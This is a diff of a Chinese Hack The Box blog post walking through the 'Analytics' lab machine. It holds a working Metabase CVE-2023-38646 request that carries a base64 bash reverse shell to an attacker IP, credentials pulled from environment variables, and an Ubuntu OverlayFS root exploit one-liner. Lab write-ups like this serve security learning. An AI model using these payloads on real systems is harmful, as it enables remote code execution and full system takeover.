@@ -8,7 +8,7 @@
     <meta http-equiv="Cache-Control" content="no-siteapp">
     <title>
         
-            归档
+            HTB_Analytics-第三季度
         
     </title>
     <link rel="shortcut icon" href="#"/>
@@ -31,15 +31,36 @@
 <meta name="generator" content="Hexo 6.3.0"></head>
 <body>
     <a id="cover"></a>
-    <link type="text/css" rel="stylesheet" href="/css/archive.css">
+    <link type="text/css" rel="stylesheet" href="/css/post.css">
 <div id="header" class="header">
     <div class="vertical">
         <div class="inner">
             
-                <h1 class="header-subtitle">归档</h1>
+                <h1 class="header-subtitle">HTB_Analytics-第三季度</h1>
                 <div class="header-subinfo">
-                    <p class="article-info-text Chinese"></p>
-                    <p class="article-info-text English"></p>                  
+                    <p class="article-info-text">
+                        <span>
+                            <i class="iconfont icon-time"></i> 发表时间：2023-10-13
+                        </span>
+                        
+                            <span id="/2023/10/13/HTB-Analytics-第三季度/" class="leancloud_visitors" data-flag-title="HTB_Analytics-第三季度">
+                                <i class="iconfont icon-browse"></i> 阅读：<sapn class="leancloud-visitors-count"></span>
+                            </span>
+                        
+                        <span>
+                            <i class="iconfont icon-interactive"></i> 评论：<span class="valine-comment-count" data-xid="/2023/10/13/HTB-Analytics-第三季度/"></span>
+                        </span>  
+                    </p>
+                    
+                        
+                            <span class="category-color">HTB</span>
+                        
+                    
+                    
+                        
+                            <span class="tag-color">HTB</span>
+                        
+                    
                 </div>
             
         </div>
@@ -48,135 +69,115 @@
 </div>
 <div id="container">
     
-        
-            <!-- 归档页面、分类归档页面、标签归档页面 -->
-            <div class="articles">
-                <div class="articles-wrap">
-                    <span class="archive-move-on"></span>
-                    <span class="archive-counter">
+        <!-- 文章页面 -->
+        <div id="article">
+            <div class="toc"></div>
+            <div class="article-body">
+                <h1 id="Analytics"><a href="#Analytics" class="headerlink" title="Analytics"></a><strong>Analytics</strong></h1><p>第一次打这个东西，我只能说是真有意思，还能上分，哈哈，就是这会员有点贵，不冲会员也能玩</p>
+<p>难度简单</p>
+<p>开始给下发个ip吗  <strong>10.10.11.233</strong></p>
+<p>告诉你了是linux ，难度简单那我就简单扫</p>
+<p><code>nmap -p- --min-rate 10000 10.10.11.233</code>  –》 发现开放了<code>22</code> 和 <code>80</code>端口</p>
+<p>再详细扫一下</p>
+<p><code>nmap -p 22,80 --min-rate 10000 -sCV 10.10.11.233</code></p>
+<p>发现 80 端口跳转了 ，跳转到了  analytical.htb  这个域名上面 </p>
+<p>然后我用ffuf 这款工具 这个是 kali 自带的工具 </p>
+<p><code>ffuf -u http://10.10.11.233 -H &quot;Host: FUZZ.analytical.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 145</code></p>
+<p>将ip和域名绑定进行了一个子域名扫描 ，发现只有一个结果 data</p>
+<p>接下来 我们在 hosts 文件中 将 ip和域名绑定一下</p>
+<p><img src="/image/picture/HTB3/anay/hosts.png%22hosts%22" alt="这是图片"></p>
+<p>然后就能访问跳转的域名了  ，  然后我们发现 data.xxxx 是一个matabase，我们去搜索一下相关的漏洞巧了</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46944519/article/details/132076766">【漏洞复现】Metabase 远程命令执行漏洞(CVE-2023-38646)_李火火安全阁的博客-CSDN博客</a></p>
+<p>这又一个相关漏洞 还这么新，直接利用上</p>
+<p>或者这还有脚本呢</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/robotmikhro/CVE-2023-38646">robotmikhro&#x2F;CVE-2023-38646：元数据库漏洞利用的自动工具，称为 CVE-2023-38646 (github.com)</a></p>
+<p>我是利用的poc </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">POST /api/setup/validate HTTP/1.1</span><br><span class="line">Host: data.analytical.htb</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: metabase.DEVICE=49a32d12-7c1c-4d9b-ab08-e24d2cdc72e7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 804</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;token&quot;: &quot;249fa03d-fd94-4d5b-b94f-b4ebf3df681f&quot;,</span><br><span class="line">    &quot;details&quot;:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;is_on_demand&quot;: false,</span><br><span class="line">        &quot;is_full_sync&quot;: false,</span><br><span class="line">        &quot;is_sample&quot;: false,</span><br><span class="line">        &quot;cache_ttl&quot;: null,</span><br><span class="line">        &quot;refingerprint&quot;: false,</span><br><span class="line">        &quot;auto_run_queries&quot;: true,</span><br><span class="line">        &quot;schedules&quot;:</span><br><span class="line">        &#123;&#125;,</span><br><span class="line">        &quot;details&quot;:</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;db&quot;: &quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(&#x27;bash -c &#123;echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzgvNTU1NSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;)\n$$--=x&quot;,</span><br><span class="line">            &quot;advanced-options&quot;: false,</span><br><span class="line">            &quot;ssl&quot;: true</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;name&quot;: &quot;test&quot;,</span><br><span class="line">        &quot;engine&quot;: &quot;h2&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/picture/HTB3/anay/burp.png%22hosts%22" alt="这是图片"></p>
+<p>这样  这样反弹shell bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzgvNTU1NSAwPiYx}|{base64,-d}|{bash,-i}</p>
+<p>成功反弹出来 ， 对了反弹之前可以先验证一下 ，目标是内网机器肯定没法出网，就让他ping我们看看能不能收到</p>
+<p><code>python3 -m http.server 80 </code>  开个服务</p>
+<p>然后执行<code>crul xxxxxxip </code>结果这里收到就成功利用了</p>
+<p>反弹成功之后  先找找信息收集一下</p>
+<p>ls -al</p>
+<p>发现了 .dockerenv 证明这个网站应该是再这个docker容器中，那我们接下来看看这个配置文件吧</p>
+<p><img src="/image/picture/HTB3/anay/docker.png%22hosts%22" alt="这是图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">MB_LDAP_BIND_DN=</span><br><span class="line">LANGUAGE=en_US:en</span><br><span class="line">USER=metabase</span><br><span class="line">HOSTNAME=36f8ce81e652</span><br><span class="line">FC_LANG=en-US</span><br><span class="line">SHLVL=4</span><br><span class="line">LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib</span><br><span class="line">HOME=/home/metabase</span><br><span class="line">OLDPWD=/</span><br><span class="line">MB_EMAIL_SMTP_PASSWORD=</span><br><span class="line">LC_CTYPE=en_US.UTF-8</span><br><span class="line">JAVA_VERSION=jdk-11.0.19+7</span><br><span class="line">LOGNAME=metabase</span><br><span class="line">_=-al</span><br><span class="line">MB_DB_CONNECTION_URI=</span><br><span class="line">PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">MB_DB_PASS=</span><br><span class="line">MB_JETTY_HOST=0.0.0.0</span><br><span class="line">META_PASS=An4lytics_ds20223#</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">MB_LDAP_PASSWORD=</span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">MB_EMAIL_SMTP_USERNAME=</span><br><span class="line">MB_DB_USER=</span><br><span class="line">META_USER=metalytics</span><br><span class="line">LC_ALL=en_US.UTF-8</span><br><span class="line">JAVA_HOME=/opt/java/openjdk</span><br><span class="line">PWD=/</span><br><span class="line">MB_DB_FILE=//metabase.db/metabase.db</span><br><span class="line"></span><br><span class="line">META_USER=metalytics</span><br><span class="line">META_PASS=An4lytics_ds20223#</span><br></pre></td></tr></table></figure>
+
+<p>在里面发现了用户名和密码，ok，直接ssh</p>
+<p>登录之后信息收集一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null  查看suid 权限文件</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/os-release 查看本机信息</span><br><span class="line"></span><br><span class="line">msf searchspolit   </span><br></pre></td></tr></table></figure>
+
+<p>没发现啥提权的，自己不是root权限 找不到flag  ，</p>
+<p>去搜一下 版本号 Ubuntu 22.04</p>
+<p>正好有一个</p>
+<p><a target="_blank" rel="noopener" href="https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/?rdt=64048">Ubuntu 本地权限提升 （CVE-2023-2640 &amp; CVE-2023-32629）：r&#x2F;selfhosting (reddit.com)</a></p>
+<p>直接给我用上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unshare -<span class="built_in">rm</span> sh -c <span class="string">&quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;</span></span><br><span class="line"><span class="string">setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*; u/python3 -c &#x27;import os;os.setuid(0);os.system(\&quot;bash\&quot;)&#x27;&quot;</span>;<span class="built_in">rm</span> -rf l u w m</span><br></pre></td></tr></table></figure>
+
+
+
+<p>直接给我root 权限</p>
+<p>直接我ls cat flag</p>
+<p>一点不惯着</p>
+
+                
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/touxiang.jpg" alt="章鱼海绵">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>章鱼海绵
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/2023/10/13/HTB-Analytics-%E7%AC%AC%E4%B8%89%E5%AD%A3%E5%BA%A6/" target="_blank">HTB_Analytics-第三季度</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>简单地活着, 肆意又精彩.
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                    <div class="category">
+                        分类：
                         
-                            目前共计 33 篇日志，继续加油！
+                            <a href="/categorie/HTB/">HTB</a>
                         
-                    </span>
-                    
-                    
+                    </div>
+                
+                
+                    <div class="tag">
+                        标签：
                         
-                            <div class="archive-title">
-                                <h2 class="archive-year">2023</h2>
-                            </div>
-                            
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/05/31/xml%E5%AD%A6%E4%B9%A0/"><span>xml学习</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">05-31</span>
-                                </div>
-                            </div>
-                        </div>
+                            <a href="/tag/HTB/">HTB</a>
+                        
+                    </div>
+                
+                <div class="article-prev-next">
                     
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/04/30/postgresql%E6%95%B0%E6%8D%AE%E5%BA%93/"><span>postgresql数据库</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">04-30</span>
-                                </div>
-                            </div>
-                        </div>
                     
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/04/28/msf%E4%BD%BF%E7%94%A8/"><span>msf使用</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">04-28</span>
-                                </div>
-                            </div>
-                        </div>
-                    
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/04/28/%E5%85%8D%E6%9D%80/"><span>免杀</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">04-28</span>
-                                </div>
-                            </div>
-                        </div>
-                    
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/04/20/%E6%80%9D%E8%B7%AF/"><span>渗透测试思路</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">04-20</span>
-                                </div>
-                            </div>
-                        </div>
-                    
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/04/13/windows%E6%8F%90%E6%9D%83%E8%87%AA%E6%88%91%E6%80%BB%E7%BB%93ing/"><span>windows提权自我总结ing</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">04-13</span>
-                                </div>
-                            </div>
-                        </div>
-                    
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/04/05/CS%E5%81%9A%E6%88%90%E6%9C%8D%E5%8A%A1/"><span>CS做成服务</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">04-05</span>
-                                </div>
-                            </div>
-                        </div>
-                    
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/04/05/APP%E6%B5%8B%E8%AF%95%E6%9C%8D%E5%8A%A1%E7%AB%AF/"><span>APP测试服务端</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">04-05</span>
-                                </div>
-                            </div>
-                        </div>
-                    
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/04/05/APP%E6%B5%8B%E8%AF%95%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%B9%E5%90%91/"><span>APP测试客户端方向</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">04-05</span>
-                                </div>
-                            </div>
-                        </div>
-                    
-                           
-                        <div class="article">
-                            <div class="article-header">
-                                <h1 class="article-title"><a href="/2023/03/30/sql%E6%B3%A8%E5%85%A5%E6%9D%82%E8%AE%B0/"><span>sql注入杂记</span></a></h1>
-                                <div class="article-meta">
-                                    <span class="article-time">03-30</span>
-                                </div>
-                            </div>
-                        </div>
+                        <a href="/2023/09/25/fofax%E9%A3%9F%E7%94%A8/" class="next-prefix">» </a> 下一篇：    <a href="/2023/09/25/fofax%E9%A3%9F%E7%94%A8/" title="发布于 2023-09-25 05:53">fofax食用</a>
                     
                 </div>
             </div>
             
+    <div class="article-comments">
         
-    <div class="pagination-bottom">
-        <div class="pagination">
-            
-                <a class="extend prev" rel="prev" href="/archive/">上一页</a><a class="page-number" href="/archive/">1</a><span class="page-number current">2</span><a class="page-number" href="/archive/page/3/">3</a><a class="page-number" href="/archive/page/4/">4</a><a class="extend next" rel="next" href="/archive/page/3/">下一页</a>
-            
-        </div>
+            <div class="comments-title">
+                评论列表
+            </div>
+        
+        <div class="comments-content"></div>
     </div>
 
+        </div>
     
 </div>
     <div id="footer"></div>
@@ -208,7 +209,7 @@
                     
                         <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
                     
-                        <li class=" active "><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
+                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
                     
                         <li class=""><a href="/donate" class="" target="_self"><span class="iconfont icon-heart-fill"></span>赞赏</a></li>
                     
